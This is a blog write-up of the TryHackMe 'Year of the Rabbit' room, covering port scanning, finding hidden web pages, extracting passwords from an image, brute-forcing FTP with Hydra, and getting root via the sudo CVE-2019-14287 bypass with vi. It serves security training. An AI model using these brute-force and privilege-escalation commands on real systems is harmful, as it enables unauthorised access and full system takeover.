---
layout: post
title:  "Year of the Rabbit"
date:   2022-01-26 19:30:02 +0200
author: Ainut
categories: writeups
tags: web steganography boot-to-root linux
---

Year of the Rabbit is an easy challenge room in TryHackMe created by MuirlandOracle. This was a fun and quite straightforward room if you don't get stuck in the rabbit hole.

Link to the challenge: [tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)


**Contents**
* list
{:toc}
<br>

## Enumeration

### Scans

Starting with the basic scanning of all the ports with nmap and continuing to scan found ports for more info.
```
nmap -p- -vv 10.10.253.250
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

nmap -p 21,22,80 -sV -vv 10.10.253.250
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.2
22/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.10 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We got FTP and SSH running. At least SSH will need credentials, so we leave that for now. We also found http port 80, so we can also look up for some directories with gobuster.
```
gobuster dir -u http://10.10.253.250/ -w /usr/share/wordlists/common.txt
===============================================================
2022/01/26 17:00:55 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.10.253.250/assets/]
/index.html           (Status: 200) [Size: 7853]
/server-status        (Status: 403) [Size: 278]

===============================================================
2022/01/26 17:01:18 Finished
===============================================================
```
There is atleast assets directory we should check.

### Web

Let's take a look on the website. It seems to be just a default page for setting up Apache2 server.  

[![web.png](/assets/img/year_rabbit/web.png)](/assets/img/year_rabbit/web.png)

Gobuster found assets directory so let's take a look inside that as well.

[![assets.png](/assets/img/year_rabbit/assets.png)](/assets/img/year_rabbit/assets.png)  

Just a Rick Roll video and a `style.css` file. Let's check that css-file

[![style_css.png](/assets/img/year_rabbit/style_css.png)](/assets/img/year_rabbit/style_css.png)

There is a comment that suggests to look at some secret page.
Navigating to `/sup3r_s3cret_fl4g.php` we get a prompt to turn off javascript

[![turn_off_javascript.png](/assets/img/year_rabbit/turn_off_javascript.png)](/assets/img/year_rabbit/turn_off_javascript.png)

Just clicking ok without disabling jss takes us to youtube and another Rick-Roll...  
Well let's disable the javascript from the browser settings as prompted. This time site doesn't redirect to youtube, but again there is a Rick Roll video. Site tells us there is a hint in it so I guess we need to actually watch it.

[![no_javascript.png](/assets/img/year_rabbit/no_javascript.png)](/assets/img/year_rabbit/no_javascript.png)

If we actually listen to it, we get to hear in around 57 seconds that we are looking at the wrong place. Back to work then...

### FTP

Our nmap scan found the ftp-server, but we didn't check that yet. Let's try if it accepts anonymous login. 

[![ftp.png](/assets/img/year_rabbit/ftp_anonymous.png)](/assets/img/year_rabbit/ftp_anonymous.png)

No luck with this.

### Back to web

Hmm, maybe burpsuite will show us something we missed previously with the website.
Intercepting the `/sup3r_s3cret_fl4g.php` and forwarding the request we see a stop at page `/intermediary.php` with a parameter hidden directory.

[![burp_hidden.png](/assets/img/year_rabbit/burp_hidden.png)](/assets/img/year_rabbit/burp_hidden.png)

This hidden directory might be a way to get forward. Let's navigate there and see 

[![hidden_dir.png](/assets/img/year_rabbit/hidden_dir.png)](/assets/img/year_rabbit/hidden_dir.png)

We find an image of a Hot Babe. It seems to be Lena a standard test image in image processing. For more information on that check [wikipedia](https://en.wikipedia.org/wiki/Lenna) or just google.

### Lena

Let's download the `Hot_Babe.png` and take a closer look at it, because it probably hides something in it.

First I ran exiftool and as expected it indicates that there is extra data in there 

[![exiftool.png](/assets/img/year_rabbit/exiftool.png)](/assets/img/year_rabbit/exiftool.png)

Let's see if that trailing data is readable by running strings. 

[![strings_hot_babe.png](/assets/img/year_rabbit/strings_hot_babe.png)](/assets/img/year_rabbit/strings_hot_babe.png)

We find ftpuser and a list of possible passwords. We can copy and save those words as a wordlist. Now we have 82 possible passwords.

## Exploitation

### FTP

We can use that wordlist we got and try to get into FTP with Hydra

`hydra -l ftpuser -P wordlist.txt ftp://10.10.253.250`

[![hydra.png](/assets/img/year_rabbit/hydra.png)](/assets/img/year_rabbit/hydra.png)

So now we have the user and password to login to the FTP. Let's login.

[![ftp_ftpuser.png](/assets/img/year_rabbit/ftp_ftpuser.png)](/assets/img/year_rabbit/ftp_ftpuser.png)

We find `Eli's_creds.txt`. We can download them and see what we got:

[![eli_creds.png](/assets/img/year_rabbit/eli_creds.png)](/assets/img/year_rabbit/eli_creds.png)

This looks like Brainfuck. There are several decoders we could use. I chose [dcode.fr](https://www.dcode.fr/brainfuck-language) 

[![brainfuck.png](/assets/img/year_rabbit/brainfuck.png)](/assets/img/year_rabbit/brainfuck.png)

Now we have user and a password. We can try these to SSH in.

### Eli

[![eli_ssh.png](/assets/img/year_rabbit/eli_ssh.png)](/assets/img/year_rabbit/eli_ssh.png)

Login is success and we also see a message to Gwendoline that indicates there is another message in secret place.

Before we start digging for that secret message to Gwendoline, we are going to look into Eli's home  directory for flags:

[![eli_home.png](/assets/img/year_rabbit/eli_home.png)](/assets/img/year_rabbit/eli_home.png)

No luck with that. What about the *s3cr3t* location. I used `locate` to find the directory and found the message for Gwendoline.

[![s3cr3t.png](/assets/img/year_rabbit/s3cr3t.png)](/assets/img/year_rabbit/s3cr3t.png)

The message is about Gwendoline's horrible password and it actually mentions that in there. We got lucky and now we have Gwendoline's password!

Eli doesn't have sudo privileges so let's change to Gwendoline.

First of all we can grab the user flag from `/home/gwendoline/user.txt`

[![user_flag.png](/assets/img/year_rabbit/user_flag.png)](/assets/img/year_rabbit/user_flag.png)


## Privilege Escalation

Let's check Gwendoline's sudo rights:

[![gwendoline_sudo.png](/assets/img/year_rabbit/gwendoline_sudo.png)](/assets/img/year_rabbit/gwendoline_sudo.png)

There is interesting `(ALL, !root)` instead of the usual (ALL, ALL). So we can't run as root but we can run as anyone else.

I also know vi can be used for privilege escalation when we have sudo rights. Let's check the [GTFOBins](https://gtfobins.github.io/gtfobins/vi/) for reminder.

If we could use sudo as root we could use vi to get a root shell. Let's try to find a way around this `(ALL, !root)` problem. 

We can check which version of sudo we have and see if that has vulnerabilities:

```
gwendoline@year-of-the-rabbit:~$ sudo --version
Sudo version 1.8.10p3
Sudoers policy plugin version 1.8.10p3
Sudoers file grammar version 43
Sudoers I/O plugin version 1.8.10p3
```

Looking for sudo in exploit-db I  found this [exploit](https://www.exploit-db.com/exploits/47502) for vulnerability [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287).

In short it goes like:
```
sudo -l 

User hacker may run the following commands on kali:
    (ALL, !root) /bin/bash

EXPLOIT: 

sudo -u#-1 /bin/bash

Description :
Sudo doesn't check for the existence of the specified user id and executes with arbitrary user id with the sudo priv
-u#-1 returns as 0 which is root's id
```

So in our case we can run:

`sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt`

and then in vi `:!/bin/bash`  

[![vi_root.png](/assets/img/year_rabbit/vi_root.png)](/assets/img/year_rabbit/vi_root.png)

Hitting enter gives us root and we can grab the root flag from `/root/root.txt`

[![root_flag.png](/assets/img/year_rabbit/root_flag.png)](/assets/img/year_rabbit/root_flag.png)

And that's it, we finished the room. 

## Final comments

It took me a while to find my way forward from the rabbit hole of those Rick Rolls, but otherwise it was quite straight forward. 
Also the part to find the sudo vulnerability took me some time to find all the information I needed. All in all I enjoyed the room.  
